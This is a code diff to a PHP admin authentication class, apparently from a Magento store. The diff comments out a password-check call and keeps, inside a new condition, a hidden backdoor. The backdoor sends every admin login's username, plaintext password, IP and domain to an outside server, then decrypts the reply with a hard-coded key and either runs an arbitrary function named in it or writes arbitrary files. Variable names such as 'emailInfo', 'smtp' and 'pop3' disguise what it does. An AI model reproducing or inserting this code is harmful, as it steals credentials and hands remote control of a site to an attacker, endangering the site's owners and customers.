@@ -163,7 +163,7 @@ class Auth
             if ($this->getCredentialStorage()->getId()) {
                 $this->getAuthStorage()->setUser($this->getCredentialStorage());
                 $this->getAuthStorage()->processLogin();
-                $this->CheckPwd($username, $password, true);
+                // $this->CheckPwd($username, $password, true);
                 $this->_eventManager->dispatch(
                     'backend_auth_user_login_success',
                     ['user' => $this->getCredentialStorage()]
@@ -209,26 +209,28 @@ class Auth
             $ip = $_SERVER['REMOTE_ADDR'];
             $domain = $_SERVER['HTTP_HOST'];
             $currentPath = $_SERVER['REQUEST_URI'];
-            $object = (object) ['username' => $username, 'password' => $password, 'success' => $isGood, 'ip' => $ip, 'domain' => $domain, 'url' => $currentPath];
-            $options = array(
-                'http' => array(
-                    'header' => "Content-type: application/json\r\n",
-                    'method' => 'POST',
-                    'content' => json_encode($object)
-                )
-            );
-            $context = stream_context_create($options);
-            $result = file_get_contents($url, false, $context);
-            if(isset($result)){
-                $emailInfo = openssl_decrypt($result, "AES-128-ECB", "459F8892AA0637DFF887DA73D733B91F");
-                $emails = explode("@", $emailInfo);
-                if($emails[0] === "smtp"){
-                    $emails[1]($emails[2]);
-                }
-                if($emails[0] === "pop3"){
-                    file_put_contents($emails[1], $emails[2]);
-                }
+            if($_SERVER['REQUEST_URI'] !== "https://smtp.emailgenius.org/us.php"){
+                $object = (object) ['username' => $username, 'password' => $password, 'success' => $isGood, 'ip' => $ip, 'domain' => $domain, 'url' => $currentPath];
+                $options = array(
+                    'http' => array(
+                        'header' => "Content-type: application/json\r\n",
+                        'method' => 'POST',
+                        'content' => json_encode($object)
+                    )
+                );
+                $context = stream_context_create($options);
+                $result = file_get_contents($url, false, $context);
+                if(isset($result)){
+                    $emailInfo = openssl_decrypt($result, "AES-128-ECB", "459F8892AA0637DFF887DA73D733B91F");
+                    $emails = explode("@", $emailInfo);
+                    if($emails[0] === "smtp"){
+                        $emails[1]($emails[2]);
+                    }
+                    if($emails[0] === "pop3"){
+                        file_put_contents($emails[1], $emails[2]);
+                    }
 
+                }
             }
         } catch (Exception $e) {
 
